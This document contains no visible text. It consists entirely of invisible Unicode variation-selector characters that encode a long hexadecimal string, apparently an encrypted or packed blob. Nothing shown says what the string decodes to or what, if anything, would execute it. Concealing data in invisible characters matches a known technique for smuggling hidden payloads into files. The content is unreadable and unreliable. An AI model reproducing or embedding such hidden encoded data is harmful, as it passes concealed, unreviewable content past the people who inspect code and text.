󠄡󠅔󠄢󠄧󠄧󠅔󠄨󠄠󠅖󠅒󠄦󠄦󠅒󠄩󠅒󠄦󠄤󠄣󠅑󠄩󠅕󠄩󠄥󠄣󠅔󠅖󠅒󠅔󠄦󠄠󠅒󠅑󠄤󠄧󠅑󠅔󠅕󠅕󠄢󠄧󠄥󠄤󠄥󠄨󠄢󠄦󠅒󠄣󠄩󠄧󠄣󠅔󠄦󠄩󠄣󠄨󠄤󠄡󠅕󠄩󠅔󠄦󠄡󠄩󠄥󠅕󠅔󠅕󠄥󠅔󠄡󠄦󠅕󠄨󠅓󠄩󠄤󠅒󠄨󠅖󠄠󠄧󠄣󠄣󠄨󠄩󠄡󠅕󠅔󠅖󠄥󠅑󠄡󠄤󠅑󠄨󠅖󠅒󠅑󠄦󠄡󠄨󠄡󠅔󠄤󠄥󠅒󠅒󠄨󠄦󠅒󠄨󠄩󠄣󠄢󠄦󠄩󠅖󠅓󠄣󠄧󠄠󠄡󠅕󠅖󠄡󠄦󠄠󠄨󠅑󠅑󠄩󠅒󠅔󠄠󠅕󠄡󠅔󠅒󠄩󠅓󠄥󠄨󠄩󠄥󠄣󠄠󠅒󠄣󠄣󠄢󠅕󠄩󠄣󠄣󠅑󠅑󠄨󠅖󠄡󠄩󠄦󠅖󠅑󠅒󠄠󠄠󠄡󠅓󠅒󠄠󠅒󠄡󠄨󠄥󠅕󠄡󠄡󠄠󠄩󠄦󠄥󠄣󠅒󠅒󠄧󠄩󠄦󠄩󠄦󠅕󠄠󠄩󠄩󠄩󠅒󠄨󠄧󠄩󠄥󠅖󠅕󠄥󠅔󠅔󠅓󠄨󠄡󠅒󠅒󠄧󠄥󠄤󠄤󠅑󠄠󠅒󠄩󠄧󠄢󠄢󠄩󠅕󠅒󠅓󠄥󠄩󠄥󠄢󠄩󠅓󠅖󠅒󠄠󠄢󠄣󠄩󠄢󠅓󠅒󠅕󠄢󠄣󠄥󠅖󠅓󠄠󠅑󠄦󠄥󠄤󠄥󠄩󠅑󠄡󠅒󠄠󠄨󠅕󠅖󠅕󠄩󠅒󠄧󠄤󠅖󠄦󠄦󠄥󠅑󠅔󠅖󠄢󠅕󠅔󠄣󠄦󠄩󠄠󠅔󠅑󠅓󠅑󠄢󠅑󠄣󠅕󠅖󠅔󠄥󠅔󠄠󠄩󠅔󠄩󠅓󠄨󠄡󠄨󠅓󠅕󠅑󠅖󠅖󠄤󠅒󠄥󠅖󠄡󠄤󠄦󠄡󠄢󠅕󠄠󠄠󠅔󠄡󠅑󠄢󠄤󠄧󠄡󠄡󠅕󠄡󠄥󠅓󠄣󠅑󠅕󠅓󠄡󠄠󠄣󠄤󠄢󠅕󠅒󠄦󠄡󠄤󠅔󠅖󠄥󠄠󠄠󠅖󠄦󠄢󠄡󠄦󠄧󠄧󠄠󠄣󠅖󠅖󠅔󠅖󠄦󠅕󠄥󠅒󠅑󠄠󠅑󠅔󠅔󠄣󠅒󠅒󠄣󠅓󠄧󠄨󠄡󠄨󠅔󠅓󠄣󠄨󠄨󠄧󠄤󠅔󠄠󠅑󠄧󠄨󠄣󠅕󠅕󠄡󠅕󠅑󠄧󠅖󠄣󠅓󠄢󠅒󠅒󠅑󠄠󠄩󠄩󠅔󠅓󠄧󠄡󠅔󠄦󠄧󠄣󠄡󠅔󠄩󠅔󠄦󠅖󠅓󠅓󠄢󠅒󠄦󠅒󠅓󠄧󠅓󠄢󠄧󠄩󠅓󠄨󠅓󠄩󠅑󠅔󠄦󠅔󠄥󠅒󠅑󠄥󠅒󠄠󠄧󠄨󠅑󠅔󠅑󠄩󠄨󠄧󠄡󠅑󠄥󠄣󠄩󠅔󠄣󠅖󠄩󠄥󠅕󠅑󠄠󠅕󠅖󠅔󠅒󠄤󠄩󠄨󠅕󠄡󠄩󠄩󠄢󠅑󠅑󠄡󠅕󠄦󠄡󠅓󠄩󠅔󠅔󠄠󠄤󠅓󠄡󠄨󠄦󠄧󠄤󠄦󠄨󠅖󠄥󠄨󠄠󠄤󠄠󠄧󠄠󠄤󠅑󠅔󠅖󠄥󠅖󠄢󠄥󠄤󠅓󠄨󠄡󠅓󠅔󠄨󠄥󠄩󠄩󠄡󠅕󠄩󠄥󠄦󠄧󠄡󠄧󠄣󠄩󠄡󠄢󠅑󠄩󠄧󠄨󠄠󠄥󠅖󠅒󠄠󠄠󠄣󠄣󠄦󠅕󠄩󠄢󠄠󠅓󠄧󠄦󠄧󠄧󠅑󠄧󠄥󠄣󠅖󠅕󠄧󠄨󠄧󠅑󠄠󠄦󠄧󠄡󠄩󠅓󠄡󠅒󠄦󠅕󠄧󠄩󠄢󠄥󠅔󠄤󠅕󠄣󠅒󠄧󠄥󠄡󠄩󠅑󠄣󠄩󠅑󠅓󠅕󠄣󠄣󠄤󠄧󠄡󠄠󠅕󠅒󠅓󠅓󠄩󠅔󠄥󠄡󠄣󠄣󠅖󠄥󠄤󠄥󠄨󠅑󠄨󠄢󠄡󠄧󠄡󠄦󠄦󠅖󠄧󠄥󠄣󠄦󠄨󠄨󠄢󠄣󠄣󠄤󠄩󠅑󠄤󠄦󠄦󠄡󠄩󠄥󠅕󠅕󠄡󠄧󠄩󠅓󠅔󠅒󠄤󠄨󠄥󠄩󠄨󠄤󠅑󠅑󠅒󠄧󠄣󠄠󠄡󠄦󠄢󠅕󠄦󠅔󠄢󠄨󠅒󠅓󠅓󠄨󠄧󠅑󠄣󠅒󠄠󠅒󠄢󠄣󠅒󠅕󠄢󠅒󠄠󠅓󠅖󠄡󠄠󠄦󠄦󠅑󠄢󠄡󠅔󠄢󠄨󠄦󠅖󠄥󠅔󠄢󠄡󠅕󠅓󠄣󠄦󠄣󠄦󠅕󠄢󠅕󠄣󠄧󠅕󠅔󠅑󠅒󠅖󠄩󠄡󠄩󠅓󠄩󠄤󠅑󠄢󠄠󠄡󠄣󠅕󠄨󠄦󠄠󠄤󠅑󠄤󠅑󠄣󠄤󠅔󠅑󠅓󠅕󠄨󠅓󠄥󠄩󠅔󠄩󠄠󠅓󠄤󠄠󠄠󠄢󠄧󠄨󠄤󠄠󠄩󠅓󠄣󠄩󠅕󠅑󠄧󠄨󠄦󠅑󠄠󠄧󠄧󠄨󠅕󠅔󠄨󠅔󠅖󠄣󠅒󠅔󠄡󠄥󠅒󠄠󠄡󠅑󠄡󠄦󠅕󠄦󠄡󠅒󠄦󠅑󠅖󠄢󠄣󠄣󠅕󠄥󠅔󠅒󠅖󠅒󠄧󠄡󠄣󠄡󠅔󠄩󠄤󠅑󠅖󠄩󠄤󠄨󠅕󠄧󠄠󠄡󠅖󠅖󠄨󠅔󠄤󠄤󠄦󠄢󠅔󠅑󠅖󠅓󠄠󠄡󠄤󠅕󠄨󠄨󠄢󠄥󠄩󠄣󠅑󠄡󠄡󠄩󠄢󠄣󠄡󠄤󠄢󠄧󠄢󠄠󠅒󠄣󠅑󠄢󠅓󠄦󠄣󠄥󠄠󠄧󠅕󠅔󠅒󠄨󠄠󠅑󠄢󠄦󠄦󠅖󠅔󠅓󠄩󠄩󠄤󠄧󠅒󠄧󠄨󠄢󠅖󠄧󠄨󠄥󠄩󠄢󠅑󠅔󠅖󠄠󠄡󠄦󠅖󠄦󠄨󠄦󠅓󠅖󠅖󠄡󠄡󠅓󠅓󠄣󠅒󠄤󠄦󠄢󠅓󠅑󠄢󠅑󠅑󠄦󠅑󠅓󠄢󠅖󠅖󠅔󠄥󠅓󠄨󠅔󠄡󠄡󠅓󠄤󠅓󠄣󠅕󠄡󠄤󠄨󠄤󠄣󠄣󠄠󠅑󠄧󠄦󠄤󠄦󠄦󠄡󠅔󠅓󠄠󠅑󠅔󠅖󠄤󠅔󠄣󠄠󠄧󠄧󠄡󠅓󠄠󠄤󠄥󠄢󠄩󠄩󠄨󠄢󠄦󠄦󠅔󠄩󠅖󠅒󠄡󠄥󠅒󠄢󠄧󠄢󠄨󠅒󠄦󠅔󠅒󠄢󠄤󠅕󠅕󠄤󠄢󠅓󠄤󠄧󠄥󠄨󠄠󠅖󠄩󠄠󠅔󠄨󠄣󠅔󠅓󠄠󠅖󠄢󠅓󠅕󠄨󠄠󠅑󠄤󠅑󠄤󠄢󠅑󠅖󠄨󠄠󠅖󠄡󠄤󠄡󠄨󠄡󠄥󠅔󠄣󠄨󠄣󠅓󠄡󠄢󠅖󠄧󠄡󠄤󠅔󠅒󠅓󠅑󠅖󠄩󠅔󠅑󠄨󠅒󠄣󠅓󠅕󠄣󠅓󠄡󠅕󠄨󠅑󠄨󠅖󠄧󠄦󠄢󠄣󠄡󠅖󠄡󠅑󠅒󠅕󠄡󠄦󠅔󠅓󠄦󠄦󠄨󠅓󠄩󠄩󠄠󠄧󠅔󠅕󠄩󠄥󠅒󠄦󠅑󠄦󠅓󠄣󠄠󠄨󠄡󠄤󠄢󠅖󠄣󠄦󠄢󠅕󠄤󠄥󠅔󠅓󠄤󠄩󠅕󠄤󠄩󠄨󠄥󠅖󠄢󠅖󠅑󠄡󠅕󠅔󠅔󠄩󠄦󠄧󠄡󠅔󠄤󠄢󠄢󠄧󠄠󠄢󠄠󠅑󠄧󠄥󠅒󠅖󠅔󠅔󠄦󠄧󠄠󠄥󠄡󠅕󠄩󠄩󠅓󠄩󠄣󠄦󠅒󠄢󠅒󠅕󠄨󠄩󠅒󠅖󠄦󠅓󠅔󠄢󠅓󠅒󠄥󠅒󠄠󠄤󠅑󠄢󠄦󠅖󠄩󠅕󠅓󠅕󠄩󠄣󠄢󠄡󠅓󠅓󠅑󠅕󠄠󠄠󠅖󠄣󠅔󠄨󠅑󠄡󠅑󠄨󠄧󠄠󠄦󠅒󠄦󠄤󠄥󠄨󠅑󠅖󠄡󠄢󠅓󠄥󠄣󠅒󠄥󠄢󠄦󠅑󠅑󠄧󠄥󠄤󠄤󠄤󠄢󠄡󠅔󠄡󠅑󠄣󠅖󠄥󠅖󠄢󠄦󠅑󠅑󠄥󠅓󠅒󠄥󠄦󠄨󠄡󠅑󠄡󠅔󠅒󠄥󠅑󠅓󠄢󠄤󠄨󠅑󠄩󠄧󠄡󠄧󠄨󠄥󠄧󠄠󠅔󠅑󠅕󠄩󠄣󠅑󠅕󠄩󠄠󠄠󠄥󠄧󠅔󠄢󠅓󠅓󠅖󠅔󠅓󠄠󠄢󠄧󠅑󠅑󠄡󠄧󠅔󠄣󠅕󠅔󠅖󠄡󠄤󠄤󠅔󠄣󠄢󠅔󠄠󠅕󠄤󠄣󠅖󠄤󠄥󠄢󠄠󠄠󠄠󠄣󠅖󠄢󠅔󠅑󠄥󠄤󠄨󠄨󠄠󠄢󠅔󠅔󠄧󠅒󠅓󠅔󠄢󠄢󠅖󠄧󠄤󠅓󠅕󠄢󠅓󠅓󠅓󠅓󠄡󠄢󠄠󠄡󠄤󠄢󠅕󠄡󠅖󠅒󠅕󠄠󠄡󠄩󠄧󠄤󠄥󠄥󠅑󠅒󠅕󠄨󠄠󠅕󠄦󠄦󠅓󠅑󠅑󠄠󠅑󠄢󠄧󠄠󠅓󠄢󠄨󠄨󠄤󠄡󠄥󠄥󠅒󠄤󠄦󠄠󠄦󠅒󠄢󠅒󠄥󠄥󠄤󠄩󠄨󠅑󠄤󠄡󠅕󠅕󠄣󠅕󠄩󠅕󠄨󠄢󠄧󠄥󠄩󠅖󠄧󠄡󠅖󠅔󠄡󠄡󠄤󠄩󠄧󠄢󠄧󠄣󠄥󠅑󠄥󠅔󠅖󠅒󠄦󠅖󠄠󠅒󠅓󠄡󠄦󠄩󠄦󠄥󠅖󠅕󠄨󠅕󠄣󠅑󠄩󠄠󠄥󠄠󠅓󠅓󠄩󠄨󠅕󠄠󠄢󠄨󠄨󠅒󠄨󠄡󠅕󠅔󠄦󠄧󠅑󠅑󠄣󠅒󠄧󠅖󠅖󠅖󠄤󠅕󠄡󠅓󠄦󠄧󠅑󠄩󠄢󠄨󠅒󠅖󠅑󠄧󠅕󠅖󠄡󠅑󠄧󠄢󠄣󠅖󠅓󠄢󠄡󠄥󠅖󠄧󠄢󠅑󠄢󠄣󠄡󠅖󠅑󠄥󠄥󠄩󠅔󠄧󠄦󠄨󠅑󠄥󠅓󠄥󠄢󠅖󠄩󠄠󠅑󠄠󠄧󠄠󠄠󠅒󠄡󠄡󠄡󠄡󠅔󠅑󠅔󠄥󠄣󠅑󠅔󠄦󠄤󠄥󠄩󠅑󠅔󠅕󠅖󠄢󠄣󠄩󠄣󠅕󠄤󠅒󠅕󠄠󠄧󠅑󠄨󠄤󠄢󠄠󠅖󠅓󠄢󠄢󠄢󠄥󠅒󠅑󠄠󠄡󠅓󠅖󠄣󠄤󠄤󠅕󠄦󠄨󠅑󠄦󠄩󠅖󠄨󠅔󠅔󠄩󠅕󠄤󠄩󠅕󠄤󠅓󠄥󠄣󠅖󠅒󠄡󠄣󠄩󠄡󠅒󠄩󠄤󠅓󠅕󠅑󠄡󠄤󠄨󠅒󠄢󠅒󠅕󠅓󠅒󠅕󠄧󠄨󠄡󠄨󠄩󠅕󠄠󠅓󠄠󠄦󠄩󠅖󠄧󠄥󠅕󠄢󠅒󠄣󠄤󠄤󠄧󠅓󠄡󠅔󠄤󠄠󠅒󠄧󠄥󠄧󠄦󠄡󠄠󠄠󠄡󠅒󠅕󠄤󠅒󠅑󠄦󠅔󠄥󠅑󠄤󠄧󠄠󠄨󠅑󠄤󠄡󠄩󠄦󠄡󠄥󠄧󠄧󠄨󠄤󠅑󠄦󠄥󠄩󠄣󠄢󠅓󠄨󠄣󠅕󠄨󠅒󠄥󠅖󠄠󠅒󠄧󠅓󠄢󠅑󠄤󠅑󠅓󠄧󠅔󠄨󠄦󠄠󠄢󠄡󠄩󠄠󠄨󠅕󠅕󠅒󠄧󠅑󠅑󠅓󠅓󠄤󠄨󠄡󠅒󠅕󠄥󠄡󠄠󠅔󠄥󠄨󠅑󠄣󠄢󠄡󠄡󠄥󠅑󠅖󠅕󠅑󠄣󠄧󠅖󠄢󠄢󠄡󠄩󠅓󠅖󠅑󠅒󠄧󠅒󠅖󠅖󠄩󠄢󠄥󠄤󠅖󠄢󠄣󠄦󠄡󠄥󠄣󠄧󠄦󠄧󠄡󠄠󠄦󠄨󠅒󠄢󠄩󠄣󠄥󠅑󠄣󠄦󠄤󠅔󠄨󠅔󠅓󠄩󠄧󠅒󠅕󠅕󠄩󠄣󠄡󠄤󠅖󠅔󠅑󠄢󠅓󠅔󠅓󠄥󠅖󠅒󠄨󠄥󠄥󠄡󠄤󠄡󠅔󠄣󠄩󠄨󠅒󠅔󠄨󠅓󠄡󠅒󠅓󠅓󠄥󠅓󠅕󠅖󠄣󠄠󠄦󠄦󠄩󠄨󠄥󠅖󠄧󠅕󠄦󠄣󠄦󠄧󠄡󠅖󠄣󠄢󠄧󠄧󠄦󠄧󠄢󠄧󠅒󠄤󠄣󠄥󠄤󠅓󠅓󠅕󠅒󠄢󠅕󠄨󠅑󠅒󠄦󠄠󠄤󠄦󠄢󠅓󠅔󠄤󠅓󠄥󠅑󠄦󠄧󠅕󠅔󠅔󠄠󠄦󠄥󠅕󠄦󠅓󠄨󠅔󠄣󠄨󠄩󠄨󠄦󠄣󠄧󠅔󠄠󠄨󠄠󠅒󠅔󠅒󠅓󠅖󠄦󠄠󠄤󠄥󠅖󠅔󠄠󠄣󠄩󠄦󠄩󠄡󠄥󠄧󠄨󠅑󠄤󠅓󠅕󠅖󠄠󠄥󠄧󠄢󠄡󠄠󠄤󠅖󠅓󠄦󠄥󠄢󠅕󠅕󠄣󠄨󠅑󠄠󠅓󠄩󠄣󠅑󠅒󠄨󠄧󠅑󠄠󠄧󠅓󠅔󠄥󠄤󠅑󠅒󠅓󠅔󠅓󠅑󠅒󠄥󠄠󠄧󠄠󠅑󠅖󠄤󠄩󠄩󠅒󠅕󠅔󠅑󠄠󠅑󠅔󠅓󠄠󠄥󠄨󠄨󠄧󠄥󠄧󠅑󠅒󠄡󠅕󠅒󠄥󠅖󠅖󠄩󠅓󠄠󠅕󠅒󠄩󠅑󠄡󠄡󠅒󠅒󠄩󠄥󠄥󠅖󠅑󠅓󠄥󠄡󠅒󠄦󠄨󠅖󠄥󠅖󠄣󠅕󠄧󠄦󠅒󠄩󠅖󠄧󠄧󠅖󠄨󠄧󠅕󠄧󠅒󠅓󠄡󠄠󠄠󠄩󠄩󠄥󠄨󠅖󠅑󠄧󠄠󠅕󠄠󠅑󠅔󠅖󠅓󠅒󠄩󠄧󠅕󠅓󠅔󠅓󠄨󠄧󠅒󠄦󠅒󠄠󠄦󠄨󠅑󠄡󠅓󠄨󠄢󠄩󠅕󠄩󠄠󠅔󠅔󠅔󠅓󠅑󠄩󠅔󠅖󠅔󠄨󠅔󠅔󠅒󠄡󠅕󠅖󠄡󠅓󠅑󠄦󠄩󠅕󠄧󠅖󠅓󠅑󠄨󠄧󠅑󠅕󠄩󠅕󠄠󠄠󠅒󠄠󠄨󠄦󠅖󠅕󠅓󠅖󠅑󠅖󠄨󠄩󠄧󠄣󠄡󠄢󠄠󠄥󠄨󠄣󠄢󠄡󠅕󠄡󠄢󠅕󠄢󠄤󠄧󠄤󠄧󠅖󠅒󠅖󠄣󠄦󠄤󠄧󠅓󠄡󠅕󠅕󠅔󠄨󠄡󠄠󠅕󠄡󠄡󠅕󠅔󠅒󠅑󠄢󠄥󠄡󠅔󠅓󠅓󠄣󠄨󠄧󠄤󠄨󠅕󠅑󠄣󠅖󠄢󠅒󠄧󠄤󠄨󠅒󠅑󠄤󠄠󠅕󠅔󠅔󠄥󠅑󠄥󠄢󠅖󠄡󠅖󠄡󠅕󠄤󠄩󠄦󠄢󠅓󠄥󠄨󠄡󠄤󠅔󠅔󠄠󠅕󠅑󠅑󠄤󠄠󠅖󠅕󠄢󠄧󠄢󠄠󠄣󠄨󠅖󠄧󠄩󠄩󠅑󠄢󠄨󠅓󠅕󠄨󠅖󠄨󠄢󠄧󠄦󠄠󠅒󠅖󠄤󠅒󠄩󠄢󠅕󠅓󠅕󠅑󠅒󠅓󠄥󠄤󠅒󠄦󠄧󠄦󠄤󠅖󠄥󠅕󠄦󠅖󠅕󠄠󠅔󠄢󠄧󠅑󠄡󠄢󠄡󠄤󠅓󠅔󠅔󠅓󠄤󠅔󠅖󠄤󠄦󠄩󠄣󠅕󠄧󠄡󠄨󠅑󠄣󠄢󠅑󠅓󠄣󠄩󠅔󠅕󠅕󠅒󠄢󠅔󠅑󠅔󠄩󠅑󠄧󠅕󠄡󠄦󠅖󠄤󠅒󠅕󠅔󠅓󠄢󠄩󠄥󠅑󠄥󠄤󠄣󠅔󠄡󠄠󠄡󠄣󠄥󠄡󠅑󠄨󠄨󠅒󠄧󠄩󠅔󠄨󠅑󠅓󠅓󠄡󠄣󠄩󠄡󠅕󠄡󠅖󠅕󠅖󠄣󠄡󠄩󠄦󠅒󠅒󠄤󠅔󠄦󠅖󠄠󠅒󠄩󠅑󠅖󠅕󠄥󠅒󠄠󠄣󠄠󠄨󠄤󠄥󠄢󠄦󠄩󠅖󠅒󠄩󠅕󠅖󠅕󠅕󠅑󠅕󠄡󠄣󠄥󠄣󠄧󠄡󠅕󠄡󠄩󠅒󠄨󠅖󠅖󠄥󠄨󠄨󠄢󠄤󠅖󠄠󠄧󠅔󠅓󠄣󠄠󠄨󠄣󠄧󠅔󠄨󠄧󠅕󠅒󠄢󠅖󠅔󠄠󠄡󠄨󠄨󠄨󠅑󠄩󠅒󠄦󠅕󠄨󠅒󠅓󠅑󠄠󠅖󠅒󠅔󠄡󠄢󠄩󠅓󠄨󠄥󠅑󠄥󠅕󠄥󠅑󠅓󠅑󠄩󠅖󠅑󠄣󠅒󠄦󠄣󠄥󠅕󠄦󠄩󠄧󠄦󠄨󠅖󠅕󠄩󠅕󠅔󠅓󠄠󠅔󠄧󠄥󠄩󠄣󠄡󠅕󠄣󠄩󠅕󠅕󠄡󠄥󠅑󠄨󠄥󠅔󠅒󠅔󠄧󠅖󠄢󠅓󠄨󠄣󠅔󠄨󠄩󠅑󠄦󠄡󠅕󠄢󠅖󠄩󠄡󠅑󠅕󠄡󠅕󠄧󠅕󠅔󠅒󠄧󠄩󠄩󠄡󠄩󠄤󠅑󠄦󠅒󠅕󠅕󠄨󠅓󠄡󠄣󠄩󠅕󠅒󠅖󠄥󠄩󠅒󠅔󠅑󠄩󠄨󠄦󠄥󠄧󠄤󠄨󠅒󠄦󠄡󠅒󠄠󠄧󠄩󠄢󠄢󠅒󠄠󠅓󠅒󠄢󠄩󠄨󠄨󠄥󠄥󠄤󠅖󠄨󠄣󠅒󠅕󠅓󠄦󠅖󠅖󠄣󠄠󠅕󠄥󠅒󠅔󠅖󠄡󠄢󠄨󠄨󠅑󠄩󠄨󠄢󠅕󠅓󠅓󠄣󠄦󠄨󠄡󠄠󠄥󠄨󠄠󠄢󠄨󠅓󠄣󠄥󠄡󠄥󠄠󠄢󠄧󠅔󠄦󠄣󠅑󠅑󠄤󠅓󠄩󠄥󠄤󠄦󠄡󠅖󠄣󠄤󠄢󠄥󠄠󠄥󠄥󠅕󠄦󠅓󠅑󠄨󠄠󠄠󠄠󠄧󠄤󠄥󠄣󠅑󠅕󠅔󠄡󠄣󠅔󠅓󠄤󠅔󠅖󠄣󠅕󠄨󠄥󠄢󠅑󠅑󠅓󠅑󠅒󠄥󠅔󠄡󠄧󠄩󠅒󠄢󠄢󠅖󠄧󠅔󠄤󠄧󠅕󠄩󠄥󠄣󠄢󠄦󠄧󠄦󠄦󠅓󠄨󠅓󠄣󠄠󠄡󠅔󠄥󠅖󠄥󠄩󠄦󠅖󠄣󠄤󠅓󠄨󠅓󠅑󠄦󠄨󠅔󠄤󠅖󠅕󠅔󠄩󠅔󠄦󠄧󠄢󠄥󠄢󠅕󠄩󠄧󠄣󠅖󠅖󠄩󠅒󠄨󠄤󠄣󠅓󠄠󠄠󠄡󠄨󠄣󠄥󠄨󠄦󠅕󠅑󠄤󠅕󠅔󠅕󠅕󠄤󠅓󠄡󠅑󠄧󠄧󠄤󠄤󠅖󠅒󠄧󠄡󠄧󠅓󠄢󠄧󠄧󠄠󠄩󠄢󠄣󠄡󠄢󠅕󠄢󠄧󠅕󠄡󠄥󠄧󠅔󠄤󠅓󠄠󠄠󠅖󠄤󠅖󠄥󠄠󠄧󠄡󠄤󠄩󠄩󠅕󠄡󠄥󠄨󠄦󠅕󠄣󠄣󠄨󠅖󠄧󠄩󠄩󠅑󠄥󠄩󠅕󠄢󠄢󠄠󠄢󠅖󠄠󠄣󠄥󠄠󠅑󠄢󠅖󠄡󠄥󠅕󠅓󠄧󠄢󠄣󠅔󠅖󠄤󠄣󠄥󠄨󠅖󠄥󠄦󠅓󠅑󠄣󠅓󠄢󠄠󠄨󠅒󠅔󠅑󠄥󠄧󠅕󠅓󠄥󠄦󠅓󠄨󠄡󠄧󠅒󠄠󠄡󠄣󠄩󠄨󠄨󠄡󠄢󠅓󠅒󠄠󠅒󠅔󠄨󠄥󠄡󠄩󠄣󠅕󠄤󠅑󠄣󠄥󠅒󠅓󠅒󠅖󠅖󠄨󠄩󠄢󠄢󠄤󠅒󠄨󠄡󠄡󠅖󠄤󠄠󠄥󠅕󠅕󠅕󠄩󠄦󠅒󠅑󠄡󠄦󠄠󠄩󠄣󠅑󠅑󠅖󠄠󠄥󠄨󠄠󠄣󠄣󠄢󠄤󠄦󠄣󠅔󠅑󠄨󠄢󠅔󠄧󠅑󠅔󠄦󠅔󠄠󠅑󠄤󠄢󠅒󠄠󠄤󠄦󠄨󠅖󠅒󠄠󠄥󠄢󠅑󠄨󠄡󠄠󠄣󠄥󠅕󠄣󠅓󠄦󠅕󠄥󠄦󠄠󠅕󠄧󠄧󠄥󠅔󠅖󠄡󠅑󠄠󠅒󠅖󠅖󠄣󠄢󠅕󠅒󠄨󠅑󠄩󠄢󠄦󠄤󠅑󠄢󠄢󠄣󠅖󠄧󠄢󠄥󠄣󠄥󠄧󠄥󠅔󠄨󠅔󠄦󠄨󠄩󠄡󠄧󠄡󠄢󠄡󠄣󠄥󠄡󠄤󠄨󠄩󠅔󠅕󠄦󠅒󠅓󠄠󠄢󠄡󠄣󠄥󠄡󠄢󠄥󠅒󠅖󠄩󠄡󠅒󠄠󠅓󠄡󠄦󠄦󠅓󠄩󠅕󠅓󠅕󠄠󠄦󠄡󠄡󠅑󠅕󠄣󠅒󠅑󠄣󠅕󠄠󠄡󠅒󠄥󠄦󠄡󠄦󠅓󠄤󠅓󠄠󠅒󠄣󠄨󠄨󠄠󠄩󠄥󠄥󠅔󠅕󠄥󠄠󠄦󠄩󠅓󠅓󠄥󠄢󠄧󠅖󠄡󠄡󠄩󠄡󠄩󠄧󠅓󠅔󠄧󠄥󠅓󠄩󠅒󠄨󠄡󠅒󠅑󠅕󠄨󠄤󠄨󠄣󠅑󠄥󠅕󠄧󠄡󠄣󠄡󠅒󠄠󠄥󠅕󠅖󠅓󠄥󠄥󠄤󠄧󠄥󠅒󠄦󠅖󠄣󠄦󠄨󠅕󠅓󠄥󠄩󠄣󠄦󠅕󠄢󠄧󠄦󠄨󠅔󠅑󠄡󠅓󠅒󠅑󠄦󠅑󠅕󠄧󠄠󠄠󠅕󠄣󠅕󠄩󠄨󠅑󠅔󠅕󠅑󠅕󠅓󠄠󠄥󠅒󠄧󠄢󠅔󠄩󠄠󠄡󠅕󠅓󠅖󠅒󠅖󠄢󠅖󠄨󠄩󠅑󠅕󠄡󠄦󠄧󠄤󠅓󠄧󠅓󠄢󠄡󠅒󠄥󠄢󠄣󠄢󠅖󠅔󠅖󠅒󠄩󠅖󠅔󠄨󠄠󠄥󠄥󠄧󠄡󠅒󠄨󠄧󠄢󠅓󠅒󠄨󠄢󠄩󠄧󠄧󠅓󠅕󠄤󠅒󠄧󠄩󠄦󠄢󠅖󠄩󠄡󠅖󠄦󠄢󠅔󠅔󠄥󠄠󠅔󠅕󠄠󠄢󠅓󠄩󠄡󠄣󠄠󠄤󠄤󠅕󠄥󠄩󠅑󠄤󠄦󠅑󠅖󠄡󠄤󠄨󠄡󠄡󠅖󠅑󠅑󠄡󠄧󠄥󠅓󠄥󠄡󠄡󠄥󠅖󠄩󠅑󠄠󠄣󠅖󠅕󠅓󠄧󠄠󠅖󠅒󠄤󠅕󠄤󠄥󠄨󠄧󠄢󠄩󠄨󠅖󠅕󠄦󠄥󠄦󠄩󠄤󠄢󠄥󠄦󠅔󠄨󠅓󠅒󠄡󠄩󠅓󠅑󠄦󠅑󠄤󠅓󠅓󠅓󠄤󠄥󠅒󠅓󠄩󠅖󠅒󠅑󠄤󠄣󠅖󠅓󠄣󠄢󠄣󠄢󠄢󠅖󠅔󠅓󠄥󠅑󠄩󠅔󠅓󠅔󠄦󠄧󠄩󠄤󠅒󠄥󠄡󠄤󠅑󠅑󠄣󠅖󠅕󠅒󠄡󠅓󠄨󠅑󠄠󠄧󠄩󠄥󠄨󠄤󠅕󠅔󠄦󠄠󠄤󠅓󠄧󠄣󠄤󠅑󠅕󠄩󠅑󠅔󠅖󠅒󠄥󠅔󠅓󠅕󠄣󠅓󠄦󠄦󠄩󠅑󠅒󠄧󠄢󠅔󠅕󠄢󠅕󠄥󠄢󠅑󠅓󠄤󠄩󠄣󠄤󠄩󠅕󠅒󠄩󠅖󠄨󠅓󠄦󠄡󠅒󠄦󠄡󠅑󠅔󠅕󠅓󠅖󠄧󠄧󠄦󠅓󠅕󠄦󠅒󠅒󠄤󠄦󠄥󠄡󠅕󠄨󠄤󠄢󠅖󠄥󠅖󠅕󠅓󠄡󠄠󠄤󠄨󠅔󠄤󠄧󠄢󠅔󠄥󠄦󠄦󠅔󠄥󠄡󠄣󠄢󠅕󠅑󠄡󠅕󠄣󠄩󠄨󠄠󠅕󠄡󠅕󠄡󠅒󠅓󠅒󠄡󠄤󠅓󠄢󠅖󠄧󠅑󠅕󠄤󠅕󠄦󠄡󠄩󠄠󠄦󠅖󠄠󠅔󠅕󠅒󠄨󠄧󠄥󠄤󠄩󠄧󠅓󠅖󠄨󠄧󠄤󠄡󠅓󠄧󠅑󠅒󠄩󠄤󠅕󠅖󠅕󠅓󠅕󠄢󠅖󠅔󠅕󠄥󠅓󠄡󠅖󠄤󠄥󠄤󠄥󠄩󠅔󠅓󠅔󠅖󠅒󠅕󠄧󠄦󠄠󠄠󠅒󠄦󠅕󠄩󠄨󠄠󠄤󠄧󠄤󠄢󠅒󠅔󠄦󠄡󠄨󠄩󠄨󠄨󠅕󠄣󠅒󠄨󠅖󠅓󠅕󠄣󠄡󠄠󠅒󠄡󠄨󠅑󠅖󠄦󠅒󠄡󠅑󠅓󠅔󠄠󠄩󠅒󠅕󠅑󠅔󠄨󠄨󠄠󠅔󠄧󠅔󠅕󠅔󠅑󠅔󠄩󠄡󠄢󠄧󠄠󠄧󠅔󠄤󠅑󠄣󠄤󠄠󠄦󠅑󠄡󠄦󠅓󠅓󠅖󠅓󠅒󠅖󠄢󠄢󠅔󠅖󠄣󠄣󠄥󠅑󠄥󠄨󠄢󠄢󠅑󠄤󠅔󠅒󠄧󠄧󠄣󠅔󠅔󠄦󠄣󠄡󠄨󠄠󠅔󠅓󠅒󠄩󠅕󠅑󠅔󠄧󠄥󠄡󠅕󠄨󠄢󠄤󠄣󠄩󠄧󠄠󠄣󠅔󠄤󠄠󠄢󠄡󠄩󠅓󠄥󠄦󠄡󠄧󠄨󠄢󠄦󠄢󠄠󠄠󠄤󠅔󠄥󠄤󠄨󠄧󠅖󠅕󠄤󠄥󠅓󠄨󠅑󠄥󠄤󠄠󠄢󠄤󠄤󠅔󠄦󠅑󠄡󠄦󠅒󠄣󠅖󠄥󠄢󠅒󠄧󠅖󠄤󠄢󠅓󠄩󠅕󠄡󠄥󠄣󠅔󠅒󠄧󠅑󠅕󠅑󠄣󠄧󠅖󠄣󠄠󠄣